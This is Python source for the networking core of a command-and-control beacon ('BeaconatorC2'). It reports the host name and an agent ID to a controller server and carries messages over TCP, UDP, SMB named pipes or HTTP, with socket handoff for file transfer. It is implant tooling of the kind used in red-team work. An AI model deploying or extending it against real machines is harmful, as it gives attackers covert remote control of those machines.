# PythonBeacon class - Core networking functionality

class PythonBeacon:
    def __init__(self, server_ip=None, server_port=None, protocol=None,
                 pipe_name=None, http_endpoint="/", schema_file=None,
                 checkin_interval=None):
        # Use build-time defaults if not overridden
        self.server_ip = server_ip or SERVER_IP
        self.server_port = server_port or SERVER_PORT
        self.protocol = (protocol or DEFAULT_PROTOCOL).lower()
        self.pipe_name = pipe_name or f"BeaconatorC2_{self.server_port}"
        self.http_endpoint = http_endpoint
        self.schema_file = schema_file or SCHEMA_FILE
        self.check_in_interval = checkin_interval or CHECK_IN_INTERVAL

        self.agent_id = self.generate_agent_id()
        self.computer_name = platform.node()
        self.is_running = False

        print(f"[+] Python Beacon initialized")
        print(f"    Agent ID: {self.agent_id}")
        print(f"    Computer: {self.computer_name}")
        print(f"    Protocol: {self.protocol.upper()}")
        print(f"    Server: {self.server_ip}:{self.server_port}")
        print(f"    Schema: {self.schema_file}")
        if self.protocol == "smb":
            print(f"    Pipe: {self.pipe_name}")
        elif self.protocol == "http":
            print(f"    Endpoint: {self.http_endpoint}")

    def log(self, message):
        """Instance logging method"""
        beacon_log(message)

    def send_tcp(self, message, expect_response=True, is_file_transfer=False):
        """Send message via TCP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((self.server_ip, self.server_port))

            sock.send(message.encode('utf-8'))

            if expect_response:
                if is_file_transfer:
                    return sock  # Return socket for file operations
                else:
                    response = sock.recv(4096).decode('utf-8').strip()
                    sock.close()
                    return response
            else:
                sock.close()
                return "OK"

        except Exception as e:
            self.log(f"TCP Error: {e}")
            return f"ERROR: {e}"

    def send_udp(self, message, expect_response=True):
        """Send message via UDP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)

            bytes_sent = sock.sendto(message.encode('utf-8'), (self.server_ip, self.server_port))
            self.log(f"UDP: Sent {bytes_sent} bytes to {self.server_ip}:{self.server_port}")

            if expect_response:
                try:
                    response, addr = sock.recvfrom(4096)
                    sock.close()
                    response_str = response.decode('utf-8').strip()
                    self.log(f"UDP: Received response from {addr}: {response_str}")
                    return response_str
                except socket.timeout:
                    sock.close()
                    self.log("UDP: No response received (timeout)")
                    return "ERROR: No response (timeout)"
            else:
                sock.close()
                return "OK"

        except Exception as e:
            self.log(f"UDP Error: {e}")
            return f"ERROR: {e}"

    def send_smb(self, message, expect_response=True, is_file_transfer=False):
        """Send message via SMB named pipe"""
        try:
            if os.name == 'nt':  # Windows
                pipe_path = f"\\\\.\\pipe\\{self.pipe_name}"

                try:
                    import win32file
                    import win32pipe

                    win32pipe.WaitNamedPipe(pipe_path, 5000)

                    pipe_handle = win32file.CreateFile(
                        pipe_path,
                        win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                        0, None,
                        win32file.OPEN_EXISTING,
                        0, None
                    )

                    self.log(f"SMB: Writing message to pipe: {message}")
                    win32file.WriteFile(pipe_handle, message.encode('utf-8'))

                    if expect_response:
                        if is_file_transfer:
                            return pipe_handle
                        else:
                            self.log("SMB: Waiting for response...")
                            try:
                                result, response_data = win32file.ReadFile(pipe_handle, 4096)
                                response = response_data.decode('utf-8').strip()
                                self.log(f"SMB: Received response: {response}")
                                win32file.CloseHandle(pipe_handle)
                                return response
                            except Exception as read_error:
                                self.log(f"SMB: Read error: {read_error}")
                                win32file.CloseHandle(pipe_handle)
                                return f"ERROR: Read failed: {read_error}"
                    else:
                        win32file.CloseHandle(pipe_handle)
                        return "OK"

                except ImportError:
                    self.log("pywin32 not available, using basic file operations")
                    with open(pipe_path, 'r+b') as pipe:
                        pipe.write(message.encode('utf-8'))
                        pipe.flush()

                        if expect_response:
                            response = pipe.read(4096).decode('utf-8').strip()
                            return response
                        else:
                            return "OK"

            else:  # Unix-like (FIFO)
                pipe_path = f"/tmp/beaconator_c2_pipes/{self.pipe_name}"

                if not os.path.exists(pipe_path):
                    self.log(f"SMB pipe not found: {pipe_path}")
                    return "ERROR: Pipe not found"

                self.log(f"SMB: Using FIFO: {pipe_path}")
                try:
                    with open(pipe_path, 'w') as pipe:
                        pipe.write(message)
                        pipe.flush()
                        self.log(f"SMB: Wrote to FIFO: {message}")

                    if expect_response:
                        self.log("SMB: Waiting for FIFO response...")
                        time.sleep(0.1)

                        try:
                            with open(pipe_path, 'r') as pipe:
                                response = pipe.read().strip()
                                if response:
                                    self.log(f"SMB: Received FIFO response: {response}")
                                    return response
                                else:
                                    self.log("SMB: Empty FIFO response")
                                    return "ERROR: Empty response"
                        except Exception as read_error:
                            self.log(f"SMB: FIFO read error: {read_error}")
                            return f"ERROR: FIFO read failed: {read_error}"
                    else:
                        return "OK"

                except Exception as fifo_error:
                    self.log(f"SMB: FIFO error: {fifo_error}")
                    return f"ERROR: FIFO operation failed: {fifo_error}"

        except Exception as e:
            self.log(f"SMB Error: {e}")
            if "No such file or directory" in str(e):
                return f"ERROR: Named pipe '{self.pipe_name}' not found. Make sure SMB receiver is running."
            return f"ERROR: {e}"

    def send_http(self, message, expect_response=True, is_file_transfer=False):
        """Send message via HTTP"""
        try:
            url = f"http://{self.server_ip}:{self.server_port}{self.http_endpoint}"
            data = message.encode('utf-8')

            req = urllib.request.Request(url, data=data, method='POST')
            req.add_header('Content-Type', 'application/octet-stream')
            req.add_header('User-Agent', f'BeaconatorC2-Beacon/{self.agent_id}')

            self.log(f"HTTP: Sending POST to {url}")

            if expect_response:
                if is_file_transfer:
                    response = urllib.request.urlopen(req, timeout=30)
                    return response
                else:
                    with urllib.request.urlopen(req, timeout=30) as response:
                        response_data = response.read().decode('utf-8').strip()
                        self.log(f"HTTP: Received response: {response_data}")
                        return response_data
            else:
                with urllib.request.urlopen(req, timeout=10) as response:
                    pass
                return "OK"

        except urllib.error.HTTPError as e:
            error_msg = f"HTTP Error {e.code}: {e.reason}"
            self.log(error_msg)
            return f"ERROR: {error_msg}"
        except urllib.error.URLError as e:
            error_msg = f"URL Error: {e.reason}"
            self.log(error_msg)
            return f"ERROR: {error_msg}"
        except Exception as e:
            self.log(f"HTTP Error: {e}")
            return f"ERROR: {e}"

    def send_message(self, message, expect_response=True, is_file_transfer=False):
        """Send message using configured protocol"""
        if self.protocol == "tcp":
            return self.send_tcp(message, expect_response, is_file_transfer)
        elif self.protocol == "udp":
            if is_file_transfer:
                return "ERROR: File transfer not supported over UDP"
            return self.send_udp(message, expect_response)
        elif self.protocol == "smb":
            return self.send_smb(message, expect_response, is_file_transfer)
        elif self.protocol == "http":
            return self.send_http(message, expect_response, is_file_transfer)
        else:
            return f"ERROR: Unknown protocol {self.protocol}"
